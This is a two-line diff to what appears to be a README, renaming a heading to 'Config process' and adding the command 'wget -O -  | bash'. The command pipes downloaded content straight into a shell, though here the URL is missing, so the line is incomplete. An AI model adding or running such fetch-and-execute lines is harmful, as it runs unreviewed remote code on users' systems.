@@ -1,1 +1,3 @@
-# misc
+# Config process
+
+wget -O -  | bash
